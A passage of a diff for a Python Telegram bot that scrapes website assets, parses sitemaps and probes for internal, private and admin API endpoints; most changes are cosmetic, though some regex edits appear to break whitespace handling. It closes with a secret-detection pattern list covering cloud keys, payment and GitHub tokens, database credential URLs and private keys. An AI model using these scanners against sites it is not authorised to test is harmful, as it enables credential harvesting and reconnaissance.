+    # ── Real errors → log + notify admin ──────────────────────────
     tb = "".join(traceback.format_exception(
         type(err), err, err.__traceback__
     ))
@@ -1189,7 +1190,7 @@ async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> N
 
     msg = (
         "🚨 *Bot Error Alert*\n"
-        f"--------------------{user_info}\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━{user_info}\n\n"
         f"```\n{short_tb}\n```"
     )
 
@@ -1206,12 +1207,12 @@ async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> N
     logger.error("Unhandled exception: %s", err, exc_info=err)
 
 
-# ==================================================
-# 🗑️  AUTO-DELETE   Expired download files cleaner
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🗑️  AUTO-DELETE — Expired download files cleaner
+# ══════════════════════════════════════════════════
 
 async def auto_delete_loop():
-    """Background task - ၂၄ နာရီ (FILE_EXPIRY_HOURS) ကြာတဲ့ ZIP files auto-delete"""
+    """Background task — ၂၄ နာရီ (FILE_EXPIRY_HOURS) ကြာတဲ့ ZIP files auto-delete"""
     while True:
         try:
             now     = time.time()
@@ -1241,13 +1242,13 @@ async def auto_delete_loop():
         await asyncio.sleep(3600)
 
 
-# ==================================================
-# 📋  QUEUE SYSTEM   Download request queue
-# ==================================================
+# ══════════════════════════════════════════════════
+# 📋  QUEUE SYSTEM — Download request queue
+# ══════════════════════════════════════════════════
 
 async def queue_worker(worker_id: int = 0):
     """
-    Background worker   queue ထဲက download request တွေ တစ်ခုစီ run
+    Background worker — queue ထဲက download request တွေ တစ်ခုစီ run
     V31+: Multiple concurrent workers (NUM_QUEUE_WORKERS) for parallel throughput.
     """
     global _dl_queue
@@ -1325,18 +1326,18 @@ async def enqueue_download(
         )
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 📦  DATABASE  (with async lock for race condition)
-# ==================================================
+# ══════════════════════════════════════════════════
 
-# ==============================================================
+# ══════════════════════════════════════════════════════════════
 # 🗄️  SQLite DATABASE LAYER  (replaces JSON flat-file)
-#     • Built-in sqlite3   no extra install required
+#     • Built-in sqlite3 — no extra install required
 #     • WAL mode: concurrent reads + writes without blocking
-#     • Async via run_in_executor   never blocks event loop
+#     • Async via run_in_executor — never blocks event loop
 #     • Auto-migrates from legacy bot_db.json on first run
 #     • db_lock still used for write serialization safety
-# ==============================================================
+# ══════════════════════════════════════════════════════════════
 
 def _sqlite_init():
     """Create tables if not exist. Called once at startup."""
@@ -1441,7 +1442,7 @@ def _get_con() -> sqlite3.Connection:
 
 
 def _load_db_sync() -> dict:
-    """Compatibility shim - loads full DB as dict (for code that still uses db dict pattern)."""
+    """Compatibility shim — loads full DB as dict (for code that still uses db dict pattern)."""
     con = _get_con()
     try:
         users = {}
@@ -1472,7 +1473,7 @@ def _load_db_sync() -> dict:
 
 
 def _save_db_sync(db: dict):
-    """Compatibility shim - writes full db dict back to SQLite."""
+    """Compatibility shim — writes full db dict back to SQLite."""
     con = _get_con()
     try:
         settings = db.get("settings", {})
@@ -1505,13 +1506,13 @@ def _save_db_sync(db: dict):
 
 
 async def db_read() -> dict:
-    """Async DB read - runs in executor so event loop is never blocked."""
+    """Async DB read — runs in executor so event loop is never blocked."""
     loop = asyncio.get_running_loop()
     return await loop.run_in_executor(None, _load_db_sync)
 
 
 async def db_write(db: dict):
-    """Async DB write - runs in executor."""
+    """Async DB write — runs in executor."""
     loop = asyncio.get_running_loop()
     async with db_lock:
         await loop.run_in_executor(None, _save_db_sync, db)
@@ -1527,14 +1528,14 @@ async def db_update(func):
         return db
 
 
-# ==================================================
-# ⚡  DIRECT SQLITE OPS    Targeted row-level queries
+# ══════════════════════════════════════════════════
+# ⚡  DIRECT SQLITE OPS  — Targeted row-level queries
 #     Bypass full DB load/save for simple operations
 #     Up to 10x faster for single-user updates
-# ==================================================
+# ══════════════════════════════════════════════════
 
 def _sqlite_get_user(uid: int) -> Optional[dict]:
-    """Fetch one user row directly - no full DB load."""
+    """Fetch one user row directly — no full DB load."""
     con = _get_con()
     try:
         row = con.execute("SELECT * FROM users WHERE uid=?", (str(uid),)).fetchone()
@@ -1557,7 +1558,7 @@ def _sqlite_get_user(uid: int) -> Optional[dict]:
 
 
 def _sqlite_upsert_user(uid: int, user: dict):
-    """Write one user row directly - no full DB save."""
+    """Write one user row directly — no full DB save."""
     con = _get_con()
     try:
         con.execute("""
@@ -1584,7 +1585,7 @@ def _sqlite_upsert_user(uid: int, user: dict):
 
 
 def _sqlite_is_banned(uid: int) -> bool:
-    """Fast ban check - single column query."""
+    """Fast ban check — single column query."""
     con = _get_con()
     try:
         row = con.execute(
@@ -1596,7 +1597,7 @@ def _sqlite_is_banned(uid: int) -> bool:
 
 
 def _sqlite_get_setting(key: str, default=None):
-    """Fetch one setting - no full DB load."""
+    """Fetch one setting — no full DB load."""
     con = _get_con()
     try:
         row = con.execute(
@@ -1614,13 +1615,13 @@ def _sqlite_get_setting(key: str, default=None):
 
 
 async def sqlite_get_user(uid: int) -> Optional[dict]:
-    """Async single-user fetch - runs in executor."""
+    """Async single-user fetch — runs in executor."""
     loop = asyncio.get_running_loop()
     return await loop.run_in_executor(None, _sqlite_get_user, uid)
 
 
 async def sqlite_upsert_user(uid: int, user: dict):
-    """Async single-user write - runs in executor with db_lock."""
+    """Async single-user write — runs in executor with db_lock."""
     loop = asyncio.get_running_loop()
     async with db_lock:
         await loop.run_in_executor(None, _sqlite_upsert_user, uid, user)
@@ -1691,9 +1692,9 @@ def log_download(user: dict, url: str, size_mb: float, status: str):
     user["total_downloads"] += 1
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 💾  RESUME STATE  (with HMAC integrity)
-# ==================================================
+# ══════════════════════════════════════════════════
 
 def _state_sig(state: dict) -> str:
     data = json.dumps({k: v for k, v in state.items() if k != "_sig"}, sort_keys=True)
@@ -1712,7 +1713,7 @@ def load_resume(url: str) -> dict:
             state = json.load(f)
         sig = state.pop("_sig", "")
         if not hmac.compare_digest(_state_sig(state), sig):
-            logger.warning("Resume state integrity check FAILED   ignoring")
+            logger.warning("Resume state integrity check FAILED — ignoring")
             os.remove(path)
             return empty
         return state
@@ -1733,16 +1734,16 @@ def clear_resume(url: str):
         os.remove(p)
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 📊  PROGRESS BAR (Upgraded for Telegram)
-# ==================================================
+# ══════════════════════════════════════════════════
 
 def pbar(done: int, total: int, width: int = 18,
          elapsed: float = 0.0, unit: str = "") -> str:
     if total <= 0:
         spin = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
         idx  = int(time.time() * 4) % len(spin)
-        return f"|{'░' * width}|  {spin[idx]}"
+        return f"│{'░' * width}│  {spin[idx]}"
 
     pct       = min(max(done / total, 0.0), 1.0)
     fill_exact = pct * width
@@ -1760,7 +1761,7 @@ def pbar(done: int, total: int, width: int = 18,
     elif pct < 0.7: status_icon = "🌓"
     elif pct < 1.0: status_icon = "🌔"
     else: status_icon = "🌕"
-    base = f"{status_icon} |{bar}| {pct_str}"
+    base = f"{status_icon} │{bar}│ {pct_str}"
     if elapsed > 1.0 and done > 0 and done < total:
         rate = done / elapsed
         eta  = (total - done) / rate
@@ -1772,9 +1773,9 @@ def pbar(done: int, total: int, width: int = 18,
         else: base += f" 🚀 {rate:.1f}{unit}/s"
     return base
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 🌐  JS RENDERER  (Puppeteer via subprocess)
-# ==================================================
+# ══════════════════════════════════════════════════
 
 def fetch_with_puppeteer(url: str) -> str | None:
     """
@@ -1784,7 +1785,7 @@ def fetch_with_puppeteer(url: str) -> str | None:
     if not PUPPETEER_OK:
         return None
 
-    # -- Subprocess injection fix ------------------
+    # ── Subprocess injection fix ──────────────────
     safe, reason = is_safe_url(url)
     if not safe:
         logger.warning(f"Puppeteer blocked unsafe URL: {reason}")
@@ -1815,7 +1816,7 @@ def fetch_with_puppeteer(url: str) -> str | None:
         return None
 
 def _fetch_page_sync(url: str, use_js: bool = False) -> tuple:
-    """Sync version - called via asyncio.to_thread()
+    """Sync version — called via asyncio.to_thread()
     V32 Upgrade:
     • Pooled Session (no per-call Session() leak)
     • Exponential backoff on 429 / 5xx (1s→2s→4s→8s)
@@ -1837,9 +1838,9 @@ def _fetch_page_sync(url: str, use_js: bool = False) -> tuple:
     origin = f"{parsed.scheme}://{parsed.netloc}"
     host   = parsed.hostname or ""
 
-    # -- Circuit Breaker: fail-fast on known-dead hosts --
+    # ── Circuit Breaker: fail-fast on known-dead hosts ──
     if _CIRCUIT_BREAKER.is_open(host):
-        logger.debug("Circuit OPEN   skipping %s", sanitize_log_url(url))
+        logger.debug("Circuit OPEN — skipping %s", sanitize_log_url(url))
         return None, False
 
     def _do_fetch(verify: bool, referer: str = None) -> requests.Response:
@@ -1865,7 +1866,7 @@ def _fetch_page_sync(url: str, use_js: bool = False) -> tuple:
             if resp.status_code in (403, 503) and 'cf-ray' in resp.headers:
                 if attempt < MAX_FETCH_RETRIES - 1:
                     wait = min(2 ** attempt + random.uniform(0.5, 1.5), 15)
-                    logger.debug("CF challenge on %s   wait %.1fs (attempt %d)", sanitize_log_url(url), wait, attempt)
+                    logger.debug("CF challenge on %s — wait %.1fs (attempt %d)", sanitize_log_url(url), wait, attempt)
                     time.sleep(wait)
                     continue
                 return None, False
@@ -1887,7 +1888,7 @@ def _fetch_page_sync(url: str, use_js: bool = False) -> tuple:
                 time.sleep(min(retry_after, 30))
                 continue
 
-            # 5xx server errors   retry
+            # 5xx server errors — retry
             if resp.status_code in (500, 502, 503, 504, 520, 521, 522, 524):
                 if attempt < MAX_FETCH_RETRIES - 1:
                     time.sleep(2 ** attempt)
@@ -1954,24 +1955,24 @@ def _fetch_page_sync(url: str, use_js: bool = False) -> tuple:
 
 def fetch_page(url: str, use_js: bool = False) -> tuple:
     """Returns: (html | None, js_used: bool)
-    Bug fix: requests.get() ကို sync ဖြင့် run   event loop ကို မ block ဖို့
+    Bug fix: requests.get() ကို sync ဖြင့် run — event loop ကို မ block ဖို့
     async context ထဲမှာ asyncio.to_thread(fetch_page, url) ဖြင့် ခေါ်ပါ
     """
     return _fetch_page_sync(url, use_js)
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 🔍  ASSET EXTRACTORS
-# ==================================================
+# ══════════════════════════════════════════════════
 
 def extract_assets(html: str, page_url: str, soup=None) -> set:
     """
-    Extract all asset URLs from a page   v36 Improved.
+    Extract all asset URLs from a page — v36 Improved.
 
     v36 ပြင်ချက်များ:
-    - Protocol-relative URLs (//cdn.example.com/...)   page scheme ဖြင့် resolve
+    - Protocol-relative URLs (//cdn.example.com/...) — page scheme ဖြင့် resolve
     - CSS url() improved: data: URI ကို လုံးဝ exclude
-    - @font-face multi-url() per block   old regex missed 2nd+ url()
+    - @font-face multi-url() per block — old regex missed 2nd+ url()
     - <link rel="dns-prefetch/preconnect"> ကို asset list မထည့် (false positives)
     - SRI integrity hash ကို URL တွင် မထည့်
     - Vite/Rollup /assets/ path support
@@ -1981,7 +1982,7 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
     """
     from bs4 import BeautifulSoup
 
-    # -- Parser selection (imported from bot globals) -----------------
+    # ── Parser selection (imported from bot globals) ─────────────────
     try:
         _parser = _BS_PARSER  # type: ignore[name-defined]
     except NameError:
@@ -2002,11 +2003,11 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
     parsed_base  = urlparse(page_url)
     origin       = f"{parsed_base.scheme}://{parsed_base.netloc}"
 
-    # -- Detect <base> tag for relative URL resolution ----------------
+    # ── Detect <base> tag for relative URL resolution ────────────────
     base_tag = soup.find('base', href=True)
     base_url_resolved = base_tag['href'] if base_tag else page_url
 
-    # -- Detect Webpack publicPath for better chunk URL resolution ----
+    # ── Detect Webpack publicPath for better chunk URL resolution ────
     webpack_origin = origin
     for m in _RE_WEBPACK_PUBLIC.finditer(html):
         pp = (m.group(1) or m.group(2) or "").strip()
@@ -2031,7 +2032,7 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
         lower = url.lower()
         if lower.startswith(('data:', '#', 'javascript:', 'mailto:', 'tel:', 'blob:')):
             return
-        # SRI hash guard   avoid adding sha256-xxxx as URL
+        # SRI hash guard — avoid adding sha256-xxxx as URL
         if _RE_SRI_HASH.match(url):
             return
 
@@ -2063,7 +2064,7 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
         lower = url.lower()
         if lower.startswith(('data:', '#', 'javascript:', 'mailto:', 'tel:', 'blob:')):
             return
-        # SRI hash guard   avoid adding sha256-xxxx as URL
+        # SRI hash guard — avoid adding sha256-xxxx as URL
         if _RE_SRI_HASH.match(url):
             return
 
@@ -2100,7 +2101,7 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
         Uses improved regex that avoids data: URIs and handles all quote styles.
         Also extracts @import and multi-url @font-face.
         """
-        # url()   triple-group regex: double-quote, single-quote, unquoted
+        # url() — triple-group regex: double-quote, single-quote, unquoted
         for m in _RE_CSS_URL_SAFE.finditer(css_text):
             val = m.group(1) or m.group(2) or m.group(3) or ''
             val = val.strip()
@@ -2114,11 +2115,11 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
                     _add(u)
         except NameError:
             pass
-        # @font-face   multiple url() per block (woff/woff2/ttf/otf/eot/svg)
+        # @font-face — multiple url() per block (woff/woff2/ttf/otf/eot/svg)
         for m in _RE_CSS_FONT_MULTI.finditer(css_text):
             _add(m.group(1).strip())
 
-    # == 1. <link> ===============================================
+    # ══ 1. <link> ═══════════════════════════════════════════════
     # dns-prefetch / preconnect → connections, not assets → skip
     _LINK_ASSET_RELS = frozenset({
         'stylesheet', 'icon', 'shortcut icon', 'apple-touch-icon',
@@ -2134,7 +2135,7 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
         if any(r in rel_str for r in _LINK_ASSET_RELS):
             _add(href)
 
-    # == 2. <script src> + inline JS mining ======================
+    # ══ 2. <script src> + inline JS mining ══════════════════════
     for tag in soup.find_all('script'):
         src = (tag.get('src') or '').strip()
         if src:
@@ -2164,12 +2165,12 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
                 for jm in _RE_JSONLD_IMG.finditer(blob):  # type: ignore[name-defined]
                     _add(jm.group(1))
             # Protocol-relative in JS ("//cdn.example.com/lib.js")
-            for m in _RE_PROTO_REL_URL.finditer(inline):
+            for m in _RE_PROTO_REL_URL.finditer(inline):  # type: ignore[name-defined]
                 _add(m.group(1))
         except Exception as e:
             logger.debug("extract_assets: inline JS mining error: %s", e)
 
-    # == 3. <img>   lazy-load attrs + srcset =====================
+    # ══ 3. <img> — lazy-load attrs + srcset ═════════════════════
     try:
         _lazy_attrs = _LAZY_LOAD_ATTRS  # type: ignore[name-defined]
     except NameError:
@@ -2183,7 +2184,7 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
                 _add(v)
         _parse_srcset(tag.get('srcset', ''))
 
-    # == 4. <picture> + nested <source> ===========================
+    # ══ 4. <picture> + nested <source> ═══════════════════════════
     for tag in soup.find_all('picture'):
         for source in tag.find_all('source'):
             _parse_srcset(source.get('srcset', '') or source.get('data-srcset', ''))
@@ -2191,7 +2192,7 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
             if v:
                 _add(v)
 
-    # == 5. Standalone <source> (video/audio/picture) ============
+    # ══ 5. Standalone <source> (video/audio/picture) ════════════
     for tag in soup.find_all('source'):
         for attr in ('src', 'data-src'):
             v = (tag.get(attr) or '').strip()
@@ -2199,14 +2200,14 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
                 _add(v)
         _parse_srcset(tag.get('srcset', ''))
 
-    # == 6. <video> + <audio> =====================================
+    # ══ 6. <video> + <audio> ═════════════════════════════════════
     for tag in soup.find_all(['video', 'audio']):
         for attr in ('src', 'data-src', 'poster'):
             v = (tag.get(attr) or '').strip()
             if v:
                 _add(v)
 
-    # == 7. <iframe> embeds (media platforms only) ================
+    # ══ 7. <iframe> embeds (media platforms only) ════════════════
     _IFRAME_ALLOW = ('youtube', 'vimeo', 'player', 'embed', 'video', 'cdn',
                      'dailymotion', 'twitch', 'streamable')
     for tag in soup.find_all('iframe', src=True):
@@ -2214,7 +2215,7 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
         if s and any(x in s.lower() for x in _IFRAME_ALLOW):
             _add(s)
 
-    # == 8. Deep Regex Discovery (v46) ============================
+    # ══ 8. Deep Regex Discovery (v46) ════════════════════════════
     # Find all potential API endpoints and hidden files in the entire HTML
     for m in _RE_API_ENDPOINT.finditer(html):
         _add(m.group(0))
@@ -2228,7 +2229,7 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
     for m in _RE_URL_IN_HTML.finditer(html):
         _add(m.group(1))
 
-    # == 8. <a href> downloadable files ==========================
+    # ══ 8. <a href> downloadable files ══════════════════════════
     _FILE_EXTS = frozenset({
         '.pdf', '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
         '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt',
@@ -2244,32 +2245,32 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
         if any(path_no_qs.endswith(ext) for ext in _FILE_EXTS):
             assets.add(full)
 
-    # == 9. <object> + <embed> ====================================
+    # ══ 9. <object> + <embed> ════════════════════════════════════
     for tag in soup.find_all(['object', 'embed']):
         v = (tag.get('data') or tag.get('src') or '').strip()
         if v:
             _add(v)
 
-    # == 10. SVG <image> and xlink:href ==========================
+    # ══ 10. SVG <image> and xlink:href ══════════════════════════
     for tag in soup.find_all('image'):
         for attr in ('href', 'xlink:href'):
             v = (tag.get(attr) or '').strip()
             if v and not v.startswith('#'):
                 _add(v)
 
-    # == 11. Inline style="…" url() references ===================
+    # ══ 11. Inline style="…" url() references ═══════════════════
     for tag in soup.find_all(style=True):
         style_val = tag.get('style', '')
         if style_val:
             _extract_css_urls(style_val)
 
-    # == 12. <style> block CSS (url + @import + @font-face) ======
+    # ══ 12. <style> block CSS (url + @import + @font-face) ══════
     for st in soup.find_all('style'):
         css = st.string or ''
         if css.strip():
             _extract_css_urls(css)
 
-    # == 13. <meta> OG / Twitter / Schema images =================
+    # ══ 13. <meta> OG / Twitter / Schema images ═════════════════
     _META_IMAGE_KEYS = ('image', 'thumbnail', 'banner', 'icon', 'logo',
                         'og:image', 'twitter:image')
     for tag in soup.find_all('meta'):
@@ -2281,11 +2282,11 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
         # meta refresh redirect URL
         if tag.get('http-equiv', '').lower() == 'refresh':
             content = tag.get('content', '')
-            url_m = re.search(r"""url\s*=\s*[^;\s'"]+""", content, re.IGNORECASE)
+            url_m = re.search(r'url\s*=\s*["\x27"]?([^"\x27;\s]+)', content, re.IGNORECASE)
             if url_m:
                 _add(url_m.group(1))
 
-    # == 14. JSON-LD structured data images ======================
+    # ══ 14. JSON-LD structured data images ══════════════════════
     for tag in soup.find_all('script', type='application/ld+json'):
         txt = tag.string or ''
         try:
@@ -2294,9 +2295,9 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
         except NameError:
             pass
 
-    # == 15. Raw HTML regex sweep (server-injected paths) ========
+    # ══ 15. Raw HTML regex sweep (server-injected paths) ════════
     #   protocol-relative sweep
-    for m in _RE_PROTO_REL_URL.finditer(html):
+    for m in _RE_PROTO_REL_URL.finditer(html):  # type: ignore[name-defined]
         _add(m.group(1))
     try:
         for m in _RE_URL_IN_HTML.finditer(html):  # type: ignore[name-defined]
@@ -2304,7 +2305,7 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
     except NameError:
         pass
 
-    # == 16. Manifest & BrowserConfig ============================
+    # ══ 16. Manifest & BrowserConfig ════════════════════════════
     # If we see a link to manifest.json or browserconfig.xml, we'll 
     # eventually need to parse them. For now, ensure they are in assets.
     for tag in soup.find_all('link', rel=lambda x: x and ('manifest' in x.lower() or 'config' in x.lower())):
@@ -2314,13 +2315,13 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
 
 def extract_css_assets(css: str, css_url: str) -> set:
     """
-    Extract all asset URLs from CSS text   v35 upgrade.
+    Extract all asset URLs from CSS text — v35 upgrade.
     Handles: url() with/without quotes, @import, @font-face src chains.
     Bug fix: old regex matched data: URIs and failed on unquoted url().
     Uses improved _RE_CSS_URL and _RE_CSS_IMPORT patterns.
     """
     assets = set()
-    # url(...)   covers background, border-image, mask, src, etc.
+    # url(...) — covers background, border-image, mask, src, etc.
     for m in _RE_CSS_URL.finditer(css):
         u = m.group(1).strip().strip('"\'')
         if u and not u.startswith('data:') and not u.startswith('#'):
@@ -2342,7 +2343,7 @@ def extract_media_from_js(js_content: str, base_url: str) -> set:
     """
     Mine JS/JSON files for media URLs, webpack chunks, and asset paths.
     v35 upgrade: uses module-level pre-compiled patterns (was re.compile()
-    inside the function   recompiled on every call, wasting CPU).
+    inside the function — recompiled on every call, wasting CPU).
     Also added: service worker paths, window.__INITIAL_STATE__ images.
     """
     assets = set()
@@ -2376,13 +2377,13 @@ def extract_media_from_js(js_content: str, base_url: str) -> set:
     return assets
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 🗺️  SITEMAP PARSER
-# ==================================================
+# ══════════════════════════════════════════════════
 
 def fetch_sitemap(base_url: str) -> set:
     """
-    Fetch sitemap.xml (and sitemap index)   returns all page URLs.
+    Fetch sitemap.xml (and sitemap index) — returns all page URLs.
     Supports: /sitemap.xml, /sitemap_index.xml, /robots.txt discovery
     """
     urls   = set()
@@ -2461,9 +2462,9 @@ def fetch_sitemap(base_url: str) -> set:
     return {u for u in urls if urlparse(u).netloc == netloc}
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 🔌  API ENDPOINT DISCOVERY
-# ==================================================
+# ══════════════════════════════════════════════════
 
 # Common API paths for e-commerce + news/blog sites
 _API_PATHS_ECOMMERCE = [
@@ -2662,84 +2663,148 @@ ALL_API_PATHS = list(dict.fromkeys(
 ))
 
 
-# -- API URL patterns in JS bundles -------------
+# ── API URL patterns in JS bundles ─────────────
 _JS_API_PATTERNS = [
     re.compile(r"""(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(\s*['"`]([^'"`\s]{5,200})['"`]"""),
     re.compile(r"""(?:url|endpoint|baseURL|apiUrl|API_URL|baseUrl|apiBase|BASE_URL|API_BASE)\s*[:=]\s*['"`]([^'"`\s]{5,200})['"`]"""),
-    re.compile(r"""['"`](/api/[^\s'"`\?#]{3,100})['"`]"""),
-    re.compile(r"""['"`](/rest/[^\s'"`\?#]{3,100})['"`]"""),
-    re.compile(r"""['"`](/v\d+/[^\s'"`\?#]{3,100})['"`]"""),
+    re.compile(r"""['"`](/api/[^\\s\x27"`\?#]{3,100})['"`]"""),
+    re.compile(r"""['"`](/rest/[^\\s\x27"`\?#]{3,100})['"`]"""),
+    re.compile(r"""['"`](/v\d+/[^\\s\x27"`\?#]{3,100})['"`]"""),
     re.compile(r"['\"`](https?://[^\s'\"` ]{10,200}/api/[^\s'\"` ?#]{2,100})['\"`]"),
-    re.compile(r"""['"`](/graphql[^\s'"`\?#]{0,50})['"`]"""),
+    re.compile(r"""['"`](/graphql[^\\s\x27"`\?#]{0,50})['"`]"""),
     re.compile(r"""['"`](/api/[a-zA-Z0-9_\-/]{2,80})['"`]"""),
-    re.compile(r"""(wss?://[^\s'"` ]{5,200})"""),
-    re.compile(r"""['"`](https://[a-z0-9]+\.supabase\.co/[^\s'"` ]{5,100})['"`]"""),
-    re.compile(r"""['"`](/internal/[^\s'"`\?#]{3,80})['"`]"""),
-    re.compile(r"""['"`](/private/[^\s'"`\?#]{3,80})['"`]"""),
+    re.compile(r"""(wss?://[^\\s\x27"` ]{5,200})"""),
+    re.compile(r"""['"`](https://[a-z0-9]+\.supabase\.co/[^\\s\x27"` ]{5,100})['"`]"""),
+    re.compile(r"""['"`](/internal/[^\\s\x27"`\?#]{3,80})['"`]"""),
+    re.compile(r"""['"`](/private/[^\\s\x27"`\?#]{3,80})['"`]"""),
     # V24: More patterns
-    re.compile(r"""['"`](/admin/[^\s'"`\?#]{3,80})['"`]"""),
-    re.compile(r"""['"`](/wp-json/[^\s'"`\?#]{3,100})['"`]"""),
-    re.compile(r"""['"`](/jsonapi/[^\s'"`\?#]{3,100})['"`]"""),
-    re.compile(r"""['"`](/socket\.io[^\s'"`\?#]{0,50})['"`]"""),
+    re.compile(r"""['"`](/admin/[^\\s\x27"`\?#]{3,80})['"`]"""),
+    re.compile(r"""['"`](/wp-json/[^\\s\x27"`\?#]{3,100})['"`]"""),
+    re.compile(r"""['"`](/jsonapi/[^\\s\x27"`\?#]{3,100})['"`]"""),
+    re.compile(r"""['"`](/socket\.io[^\\s\x27"`\?#]{0,50})['"`]"""),
     re.compile(r"""(?:path|route|href|to)\s*[:=]\s*['"`]([/][a-zA-Z0-9_\-/]{3,80})['"`]"""),
     re.compile(r"""process\.env\.[A-Z_]+\s*[||=]+\s*['"`]([^'"`\s]{5,150})['"`]"""),
     re.compile(r"""REACT_APP_[A-Z_]+\s*[:=]\s*['"`]([^'"`\s]{5,150})['"`]"""),
     re.compile(r"""NEXT_PUBLIC_[A-Z_]+\s*[:=]\s*['"`]([^'"`\s]{5,150})['"`]"""),
     re.compile(r"""VUE_APP_[A-Z_]+\s*[:=]\s*['"`]([^'"`\s]{5,150})['"`]"""),
-    re.compile(r"""['"`](/sse/[^\s'"`\?#]{2,60})['"`]"""),
-    re.compile(r"""['"`](/stream/[^\s'"`\?#]{2,60})['"`]"""),
-    re.compile(r"""['"`](/events/[^\s'"`\?#]{2,60})['"`]"""),
+    re.compile(r"""['"`](/sse/[^\\s\x27"`\?#]{2,60})['"`]"""),
+    re.compile(r"""['"`](/stream/[^\\s\x27"`\?#]{2,60})['"`]"""),
+    re.compile(r"""['"`](/events/[^\\s\x27"`\?#]{2,60})['"`]"""),
 ]
 
-# ==================================================
-# 🔬  /analyze   Source Code Scan Constants
+# ══════════════════════════════════════════════════
+# 🔬  /analyze — Source Code Scan Constants
 #     (used by cmd_analyze added below main)
-# ==================================================
+# ══════════════════════════════════════════════════
 
 _ANALYZE_SECRET_PATTERNS = [
-    # Cloud / infra
+    # ── Cloud / AWS ────────────────────────────────────────────────────
     (r'AKIA[0-9A-Z]{16}',                                                                 '🔴 AWS Access Key'),
-    (r'(?i)aws[_-]?secret[_-]?(?:access[_-]?)?key\s*[=:]\s*["\x27]?([A-Za-z0-9+/]{40})', '🔴 AWS Secret Key'),
-    (r'AIza[0-9A-Za-z_\-]{35}',                                                           '🟠 Google API Key'),
-    (r'(?i)firebase[_-]?api[_-]?key\s*[=:]\s*["\x27]?([A-Za-z0-9_\-]{30,})',              '🟠 Firebase Key'),
-    # Payment
-    (r'sk_live_[0-9a-zA-Z]{24,}',                                                         '🔴 Stripe Secret (LIVE)'),
-    (r'sk_test_[0-9a-zA-Z]{24,}',                                                         '🟡 Stripe Secret (test)'),
-    (r'pk_live_[0-9a-zA-Z]{24,}',                                                         '🟡 Stripe Public (LIVE)'),
-    # Auth tokens
-    (r'ghp_[a-zA-Z0-9]{36}',                                                              '🔴 GitHub PAT'),
-    (r'github_pat_[a-zA-Z0-9_]{82}',                                                      '🔴 GitHub Fine-grained Token'),
-    (r'xox[baprs]-[0-9a-zA-Z\-]+',                                                        '🟠 Slack Token'),
-    (r'(?i)discord[_-]?(token|bot)[_-]?[=:]\s*["\x27]?([A-Za-z0-9_.\-]{50,})',            '🟠 Discord Token'),
-    # Database URLs
-    (r'mongodb(?:\+srv)?://[^\s"\x27<>{}\[\]]{8,}',                                         '🔴 MongoDB URL (creds)'),
-    (r'postgres(?:ql)?://[^\s"\x27<>{}\[\]]{8,}',                                           '🔴 PostgreSQL URL (creds)'),
-    (r'mysql://[^\s"\x27<>{}\[\]]{8,}',                                                     '🔴 MySQL URL (creds)'),
-    (r'redis://[^\s"\x27<>{}\[\]]{8,}',                                                     '🟠 Redis URL'),
-    # Generic API keys
-    (r'(?i)(?:api[_-]?key|apikey|api_token)\s*[=:]\s*["\x27]([A-Za-z0-9_\-]{16,})',       '🟠 API Key'),
-    (r'(?i)(?:secret[_-]?key|app[_-]?secret)\s*[=:]\s*["\x27]([A-Za-z0-9_\-]{16,})',     '🟠 Secret Key'),
-    (r'(?i)(?:access[_-]?token|auth[_-]?token)\s*[=:]\s*["\x27]([A-Za-z0-9_.\-]{20,})',  '🟠 Auth Token'),
-    (r'(?i)jwt[_-]?secret\s*[=:]\s*["\x27]([A-Za-z0-9_\-+=/]{16,})',                      '🟠 JWT Secret'),
-    (r'(?i)password\s*[=:]\s*["\x27]([^\s"\x27]{8,})',                                        '🟡 Hardcoded Password'),
-    (r'(?i)db[_-]?password\s*[=:]\s*["\x27]([^\s"\x27]{4,})',                                '🔴 DB Password'),
-    # SaaS
-    (r'SG\.[A-Za-z0-9_\-\.]{20,}',                                                        '🟠 SendGrid Key'),
-    (r'(?i)openai[_-]?(?:api[_-]?)?key\s*[=:]\s*["\x27]?(sk-[A-Za-z0-9]{48})',           '🔴 OpenAI Key'),
-    (r'sk-[A-Za-z0-9]{48}',                                                               '🔴 OpenAI Key (direct)'),
-    (r'(?i)twilio[_-]?(?:auth[_-]?token|account[_-]?sid)\s*[=:]\s*["\x27]?([A-Za-z0-9]{32,})', '🟠 Twilio Token'),
-    # Private keys
-    (r'-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',                           '🔴 Private Key Block'),
+    (r'ASIA[0-9A-Z]{16}',                                                                 '🔴 AWS Temp Access Key'),
+    (r'AROA[0-9A-Z]{16}',                                                                 '🔴 AWS Role Key'),
+    (r'AIPA[0-9A-Z]{16}',                                                                 '🔴 AWS Instance Key'),
